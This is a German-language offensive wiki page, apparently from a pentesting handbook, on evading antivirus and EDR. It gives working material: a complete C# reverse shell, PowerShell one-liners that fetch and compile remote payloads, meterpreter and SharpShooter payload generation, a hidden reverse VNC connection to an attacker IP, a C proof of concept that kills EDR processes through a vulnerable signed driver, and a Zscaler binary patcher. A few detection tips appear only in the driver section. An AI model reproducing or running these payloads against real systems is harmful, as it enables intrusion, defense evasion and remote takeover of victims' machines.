Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der folgende Workflow **stellt zuverlässig eine nahezu originale IL wieder her**, die anschließend mit Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.<sup>[[10]](#references)</sup>

1.  Entfernung des Anti-Tampering – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im statischen *module*-Konstruktor (`<Module>.cctor`). Außerdem wird die PE-Prüfsumme gepatcht, sodass jede Änderung zum Absturz des Binaries führt. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu lokalisieren, die XOR-Schlüssel wiederherzustellen und eine bereinigte Assembly zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tampering-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Wiederherstellung von Symbolen und Kontrollfluss – übergeben Sie die *bereinigte* Datei an **de4dot-cex** (einen ConfuserEx-kompatiblen Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – das ConfuserEx 2-Profil auswählen
• de4dot macht Control-flow flattening rückgängig, stellt originale Namespaces, Klassen und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Entfernen von Proxy-Aufrufen – ConfuserEx ersetzt direkte Methodenaufrufe durch leichtgewichtige Wrapper (auch *proxy calls* genannt), um die Dekompilierung weiter zu erschweren. Entfernen Sie diese mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` anstelle undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) sichtbar sein.

4.  Manuelle Bereinigung – führen Sie das resultierende Binary unter dnSpy aus und suchen Sie nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *eigentliche* Payload zu lokalisieren. Häufig speichert die Malware diese als ein TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Die obige Kette stellt den Ausführungsfluss wieder her, **ohne das schädliche Sample ausführen zu müssen** – nützlich bei der Arbeit auf einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-Obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Kompilierungssuite bereitzustellen, der durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Schutz vor Manipulation eine erhöhte Softwaresicherheit ermöglicht.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie die Sprache `C++11/14` verwendet werden kann, um zur Kompilierzeit obfuskierten Code zu generieren, ohne externe Tools zu verwenden oder den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene obfuskierter Operationen hinzu, die vom C++-Template-Metaprogramming-Framework generiert werden und der Person, die die Anwendung cracken möchte, das Leben etwas erschweren.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache Engine für metamorphic code für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein feingranulares Code-Obfuscation-Framework für von LLVM unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf Assembly-Code-Ebene, indem reguläre Anweisungen in ROP-Ketten umgewandelt werden, wodurch unsere natürliche Vorstellung eines normalen Kontrollflusses vereitelt wird.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET-PE-Crypter.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL-Dateien in Shellcode umwandeln und anschließend laden.

## SmartScreen & MoTW

Möglicherweise ist dir dieser Bildschirm schon begegnet, wenn du einige ausführbare Dateien aus dem Internet herunterlädst und ausführst.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endbenutzer davor schützen soll, potenziell bösartige Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich mit einem reputationsbasierten Ansatz. Das bedeutet, dass ungewöhnlich heruntergeladene Anwendungen SmartScreen auslösen und dadurch den Endbenutzer warnen und daran hindern, die Datei auszuführen (die Datei kann jedoch weiterhin durch Klicken auf More Info -> Run anyway ausgeführt werden).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch zusammen mit der URL erstellt wird, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfen des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert wurden, **SmartScreen nicht auslösen**.

Eine sehr effektive Möglichkeit, um zu verhindern, dass deine Payloads den Mark of The Web erhalten, besteht darin, sie in einem Container wie beispielsweise einer ISO zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **nicht NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabecontainer verpackt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads mithilfe von [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) in ISO-Dateien verpackt werden.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsfähiger Logging-Mechanismus in Windows, der es Anwendungen und Systemkomponenten ermöglicht, **Ereignisse zu protokollieren**. Er kann jedoch auch von Security-Produkten verwendet werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) wird, ist es auch möglich, die **`EtwEventWrite`**-Funktion des User-Space-Prozesses sofort zurückkehren zu lassen, ohne Ereignisse zu protokollieren. Dazu wird die Funktion im Speicher gepatcht, sodass sie sofort zurückkehrt und dadurch das ETW-Logging für diesen Prozess effektiv deaktiviert wird.

Weitere Informationen findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Das Laden von C#-Binaries im Speicher ist schon seit geraumer Zeit bekannt und nach wie vor eine sehr gute Möglichkeit, deine Post-Exploitation-Tools auszuführen, ohne von AV erkannt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur um das Patchen von AMSI für den gesamten Prozess kümmern.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen. Dafür gibt es jedoch verschiedene Vorgehensweisen:

- **Fork\&Run**

Dabei wird ein **neuer sacrificial process gestartet**, der bösartige Post-Exploitation-Coden in diesen neuen Prozess injiziert, den bösartigen Code ausführt und den neuen Prozess nach Abschluss beendet. Dies bringt sowohl Vorteile als auch Nachteile mit sich. Der Vorteil der Fork-and-Run-Methode besteht darin, dass die Ausführung **außerhalb unseres Beacon-Implant-Prozesses** erfolgt. Das bedeutet: Wenn bei unserer Post-Exploitation-Aktion etwas schiefläuft oder erkannt wird, besteht eine **deutlich höhere Wahrscheinlichkeit**, dass unser **Implant überlebt**. Der Nachteil besteht darin, dass die Wahrscheinlichkeit, von **Behavioural Detections** erkannt zu werden, **höher ist**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der bösartige Post-Exploitation-Code **in den eigenen Prozess** injiziert. Dadurch musst du keinen neuen Prozess erstellen und von AV scannen lassen. Der Nachteil besteht jedoch darin, dass bei einem Fehler während der Ausführung deiner Payload eine **deutlich höhere Wahrscheinlichkeit** besteht, dass du deinen **Beacon verlierst**, da er abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies erfahren möchtest, sieh dir diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) an.

Du kannst C#-Assemblies auch **aus PowerShell** laden. Sieh dir dazu [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und das [Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## Verwendung anderer Programmiersprachen

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mithilfe anderer Sprachen auszuführen, indem der kompromittierte Rechner Zugriff **auf die Interpreter-Umgebung erhält, die auf dem vom Angreifer kontrollierten SMB share installiert ist**.

Indem du Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB share gewährst, kannst du **beliebigen Code in diesen Sprachen im Speicher** des kompromittierten Rechners ausführen.

Das Repository weist darauf hin: Defender scannt die Scripts weiterhin, aber durch die Verwendung von Go, Java, PHP usw. haben wir **mehr Flexibilität beim Umgehen statischer Signaturen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Scripts in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping manipuliert das Access Token eines Security-Produkts wie EDR oder AV. Durch das Reduzieren der Berechtigungen des Tokens kann der Prozess weiterlaufen, während gleichzeitig verhindert wird, dass er privilegierte Inspektions- oder Remediation-Aktionen durchführt.

Um dies zu verhindern, könnte Windows **externen Prozessen den Zugriff auf die Handles** der Tokens von Security-Prozessen verweigern.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Verwendung vertrauenswürdiger Software

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf dem PC eines Opfers zu installieren, anschließend die Kontrolle darüber zu übernehmen und Persistence aufrechtzuerhalten:<sup>[[35]](#references)</sup>
1. Lade die Software von https://remotedesktop.google.com/ herunter, klicke auf „Set up via SSH“ und anschließend auf die MSI-Datei für Windows, um die MSI-Datei herunterzuladen.
2. Führe den Installer auf dem Rechner des Opfers im Hintergrund aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gehe zurück zur Chrome-Remote-Desktop-Seite und klicke auf „Next“. Der Wizard fordert dich anschließend zur Autorisierung auf. Klicke auf die Schaltfläche „Authorize“, um fortzufahren.
4. Führe den bereitgestellten Befehl mit den erforderlichen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (der Parameter `--pin` legt die PIN fest, ohne die GUI zu verwenden).


## Erweiterte Evasion

Evasion ist ein sehr komplexes Thema. Manchmal musst du zahlreiche verschiedene Telemetriequellen in einem einzigen System berücksichtigen. Daher ist es in ausgereiften Umgebungen praktisch unmöglich, vollständig unerkannt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dir dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittenere Evasion-Techniken zu erhalten.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist außerdem ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Alte Techniken**

### **Prüfen, welche Teile Defender als bösartig erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Das Tool **entfernt Teile der Binary**, bis es **herausfindet, welcher Teil von Defender** als bösartig erkannt wird, und gibt diesen Teil separat aus.\
Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobin/avred), mit einem offenen Web-Angebot unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/).

### **Telnet Server**

Bis Windows 10 enthielten alle Windows-Versionen einen **Telnet Server**, den du (als Administrator) mit folgendem Befehl installieren konntest:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Beim Systemstart **starten** und jetzt **ausführen**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet-Port ändern** (Tarnung) und Firewall deaktivieren:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Lade es von hier herunter: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du benötigst die bin downloads, nicht das setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege unter _VNC Password_ ein Passwort fest
- Lege unter _View-Only Password_ ein Passwort fest

Verschiebe anschließend die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **victim**

#### **Reverse connection**

Der **attacker** sollte in seinem **host** die Binärdatei `vncviewer.exe -listen 5900` **ausführen**, damit sie **bereit** ist, eine umgekehrte **VNC connection** abzufangen. Führe anschließend auf dem **victim** den winvnc-Daemon `winvnc.exe -run` aus und starte `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNUNG:** Um unauffällig zu bleiben, darfst du einige Dinge nicht tun:

- Starte `winvnc` nicht, wenn es bereits ausgeführt wird, da dadurch ein [popup](https://i.imgur.com/1SROTTl.png) ausgelöst wird. Prüfe mit `tasklist | findstr winvnc`, ob es ausgeführt wird.
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, da dadurch [the config window](https://i.imgur.com/rfMQWcf.png) geöffnet wird.
- Führe `winvnc -h` nicht für die Hilfe aus, da dadurch ein [popup](https://i.imgur.com/oc18wcu.png) ausgelöst wird.

### GreatSCT

Lade es von hier herunter: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
In GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Starte nun den **Listener** mit `msfconsole -r file.rc` und **führe** den **xml payload** aus mit:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Kompilieren unseres eigenen reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erster C# Revershell

Kompiliere ihn mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwende es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# mit dem Compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C#-Obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel für das Erstellen von Injectors mit Python:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Andere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Eigenen verwundbaren Treiber mitbringen (BYOVD) – AV/EDR aus dem Kernel-Space beenden

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um Endpoint-Schutzmechanismen zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light-(PPL)-AV-Dienste nicht blockieren können.<sup>[[12]](#references)</sup>

Wichtige Erkenntnisse
1. **Signierter Treiber**: Die auf die Festplatte gelieferte Datei ist `ServiceMouse.sys`, aber das Binary ist tatsächlich der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch geladen, wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Service-Installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
| IOCTL-Code | Fähigkeit                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Einen beliebigen Prozess anhand seiner PID beenden (wird verwendet, um Defender/EDR-Dienste zu beenden) |
| `0x990000D0` | Eine beliebige Datei auf der Festplatte löschen |
| `0x990001D0` | Den Treiber entladen und den Service entfernen |

Minimales C Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum es funktioniert**: BYOVD umgeht User-Mode-Schutzmechanismen vollständig; Code, der im Kernel ausgeführt wird, kann *geschützte* Prozesse öffnen, sie beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Hardening-Features.

Erkennung / Abwehr
•  Aktivieren Sie Microsofts Blockliste für verwundbare Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
•  Überwachen Sie die Erstellung neuer *Kernel*-Services und lösen Sie einen Alarm aus, wenn ein Treiber aus einem für alle beschreibbaren Verzeichnis geladen wird oder nicht auf der Allowlist vorhanden ist.
•  Achten Sie auf User-Mode-Handles zu benutzerdefinierten Device-Objekten, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Umgehen der Posture-Prüfungen von Zscaler Client Connector durch Patching von Binaries auf der Festplatte

Zscalers **Client Connector** wendet Device-Posture-Regeln lokal an und verwendet Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen einen vollständigen Bypass:

1. Die Posture-Auswertung findet **vollständig clientseitig** statt (ein Boolean wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen nur, ob die verbindende ausführbare Datei **von Zscaler signiert** ist (über `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Durch das **Patchen von vier signierten Binaries auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Gepatchte ursprüngliche Logik | Ergebnis |
|--------|-------------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als compliant gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder Prozess, auch ein unsignierter, kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Durch `mov eax,1 ; ret` ersetzt |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Minimaler Auszug des Patchers:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nach dem Ersetzen der ursprünglichen Dateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks zeigen **grün/konform** an.
* Nicht signierte oder modifizierte Binaries können die Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das durch die Zscaler-Richtlinien definierte interne Netzwerk.

Diese Fallstudie zeigt, wie sich ausschließlich clientseitige Trust-Entscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgehen lassen.

## Protected Process Light (PPL) missbrauchen, um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) erzwingt eine Hierarchie aus Signer und Level, sodass nur gleich oder höher geschützte Prozesse sich gegenseitig manipulieren können. Aus offensiver Sicht kann man, wenn sich ein PPL-fähiges Binary legitim starten lässt und seine Argumente kontrolliert werden können, eine harmlose Funktionalität (z. B. Logging) in eine eingeschränkte, PPL-gestützte Schreibprimitive gegen geschützte Verzeichnisse verwandeln, die von AV/EDR verwendet werden.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Was einen Prozess als PPL ausführt
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess unter Verwendung der Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss ein kompatibles Protection Level angefordert werden, das zum Signer des Binaries passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Levels führen dazu, dass die Erstellung fehlschlägt.

Siehe auch eine umfassendere Einführung in PP/PPL und den LSASS-Schutz hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
